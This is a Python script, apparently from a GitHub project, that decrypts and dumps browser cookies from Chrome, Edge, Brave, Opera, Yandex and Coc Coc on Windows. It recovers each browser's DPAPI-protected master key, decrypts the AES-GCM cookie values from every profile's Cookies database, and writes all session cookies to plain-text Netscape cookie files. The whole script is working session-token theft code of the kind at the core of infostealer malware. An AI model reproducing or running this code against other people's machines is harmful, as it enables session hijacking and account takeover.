#https://github.com/danghuutruong/cooldeep/

import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import time
import re
import psutil
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class CookieMaster:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data',
            'chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
        }
        self.browser_processes = {
            'coc-coc': 'CocCocBrowser.exe',
            'chrome': 'chrome.exe',
            'edge': 'msedge.exe',
            'brave': 'brave.exe',
            'opera': 'opera.exe',
            'yandex': 'browser.exe'
        }

    def __sanitize_filename(self, name):
        return re.sub(r'[\\/*?:"<>| ]', '_', name)

    def __is_browser_running(self, browser_name):
        process_name = self.browser_processes.get(browser_name)
        if not process_name:
            return False
            
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == process_name:
                return True
        return False

    def __get_master_key(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, 'Local State')
            if not os.path.exists(local_state_path):
                return None
                
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key:
                return None
                
            encrypted_key = base64.b64decode(encrypted_key)
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Error getting master key: {e}")
            return None

    def __decrypt_cookie(self, encrypted_value, master_key):
        try:
            if not encrypted_value or len(encrypted_value) == 0:
                return ""
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = Cipher(algorithms.AES(master_key), modes.GCM(nonce, tag), backend=default_backend())
                decryptor = cipher.decryptor()
                return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8', errors='replace')
            try:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='replace')
            except:
                pass
            if isinstance(encrypted_value, bytes) and len(encrypted_value) > 15:
                try:
                    nonce = encrypted_value[3:15]
                    ciphertext = encrypted_value[15:-16]
                    tag = encrypted_value[-16:]
                    cipher = Cipher(algorithms.AES(master_key), modes.GCM(nonce, tag), backend=default_backend())
                    decryptor = cipher.decryptor()
                    return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8', errors='replace')
                except:
                    pass
            return encrypted_value.hex()
        except Exception as e:
            print(f"Decryption failed: {e}")
            return "DECRYPTION_ERROR"

    def __convert_chrome_time(self, chrome_time):
        try:
            if not chrome_time or chrome_time == 0:
                return 0
            return int(datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).timestamp()
        except:
            return 0

    def __extract_cookies_from_db(self, db_path, master_key):
        temp_db = os.path.join(os.getenv('TEMP'), f'temp_cookies_{int(time.time())}.db')
        cookies = []
        try:
            for i in range(5):  
                try:
                    shutil.copy2(db_path, temp_db)
                    break
                except PermissionError:
                    if i < 4:
                        time.sleep(0.2)  
                    else:
                        print("    [!] Failed to copy database (file locked)")
                        return []
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies')
            
            for row in cursor.fetchall():
                try:
                    host, path, secure, expires, name, encrypted_value = row
                    decrypted_value = self.__decrypt_cookie(encrypted_value, master_key)
                    
                    cookies.append({
                        'domain': host,
                        'path': path,
                        'secure': bool(secure),
                        'expires': self.__convert_chrome_time(expires),
                        'name': name,
                        'value': decrypted_value
                    })
                except Exception as e:
                    print(f"    Skipping corrupt cookie: {e}")
            
            conn.close()
        except Exception as e:
            print(f"    Database error: {e}")
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
        
        return cookies

    def export_cookies(self, output_dir='cookies'):
        os.makedirs(output_dir, exist_ok=True)
        results = []
        
        for browser_name, base_path in self.browsers.items():
            if not os.path.exists(base_path):
                print(f"[!] Browser directory not found: {browser_name}")
                continue
            if self.__is_browser_running(browser_name):
                print(f"[!] {browser_name} is running. Please close it and try again.")
                continue
            
            print(f"\n=== Processing {browser_name} ===")
            master_key = self.__get_master_key(base_path)
            if not master_key:
                print(f"  [!] Master key not found for {browser_name}")
                continue
            browser_dir = os.path.join(output_dir, self.__sanitize_filename(browser_name))
            os.makedirs(browser_dir, exist_ok=True)
            profiles = ['Default']
            for item in os.listdir(base_path):
                if item.startswith('Profile '):
                    profiles.append(item)
            for profile_name in profiles:
                profile_path = os.path.join(base_path, profile_name)
                db_path = os.path.join(profile_path, 'Network', 'Cookies')
                if not os.path.exists(db_path):
                    db_path_alt = os.path.join(profile_path, 'Cookies')
                    if os.path.exists(db_path_alt):
                        db_path = db_path_alt
                    else:
                        continue
                print(f"  - Extracting from profile: {profile_name}")
                cookies = self.__extract_cookies_from_db(db_path, master_key)
                if not cookies:
                    print("    No cookies found")
                    continue
                safe_profile = self.__sanitize_filename(profile_name)
                output_path = os.path.join(browser_dir, f"{browser_name}_{safe_profile}_cookies.txt")
                try:
                    with open(output_path, 'w', encoding='utf-8') as f:
                        f.write("# Netscape HTTP Cookie File\n")
                        f.write(f"# Browser: {browser_name}\n")
                        f.write(f"# Profile: {profile_name}\n")
                        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                        
                        for cookie in cookies:
                            domain = cookie['domain']
                            include_subdomain = 'TRUE' if domain.startswith('.') else 'FALSE'
                            expires = str(int(cookie['expires'])) if cookie['expires'] != 0 else '0'
                            value = ''.join(c for c in cookie['value'] if c.isprintable() or c in '\t')
                            
                            f.write(
                                f"{domain}\t"
                                f"{include_subdomain}\t"
                                f"{cookie['path']}\t"
                                f"{'TRUE' if cookie['secure'] else 'FALSE'}\t"
                                f"{expires}\t"
                                f"{cookie['name']}\t"
                                f"{value}\n"
                            )
                    
                    print(f"    ✓ Saved {len(cookies)} cookies to {output_path}")
                    results.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'path': output_path,
                        'count': len(cookies)
                    })
                except Exception as e:
                    print(f"    [!] Failed to write file: {e}")
        
        return results

    def print_summary(self, results):
        print("\n" + "="*60)
        print("COOKIE EXTRACTION SUMMARY")
        print("="*60)
        
        if not results:
            print("No cookies were extracted")
            return
            
        total_cookies = 0
        for result in results:
            total_cookies += result['count']
            print(f"- {result['browser']} ({result['profile']}): {result['count']} cookies")
        
        print(f"\nTotal cookies extracted: {total_cookies}")
        print(f"Saved to: {os.path.abspath('cookies')}")

if __name__ == '__main__':
    print(r"""
   ____            _     _          _            
  / ___|___   ___ | | __| |  ___  __| | ___ _ __  
 | |   / _ \ / _ \| |/ _` | / _ \/ _` |/ _ \ '_ \ 
 | |__| (_) | (_) | | (_| ||  __/ (_| |  __/ |_) |
  \____\___/ \___/|_|\__,_| \___|\__,_|\___| .__/ 
                                            |_|    
    COOKIE EXPERT- Enhanced File Lock Handling
    """)
    
    print("Starting cookie extraction...")
    print("Please close all browsers before continuing...")
    input("Press Enter to start...")
    
    start_time = time.time()
    extractor = CookieMaster()
    results = extractor.export_cookies()
    
    extractor.print_summary(results)
    print(f"\nOperation completed in {time.time() - start_time:.2f} seconds")
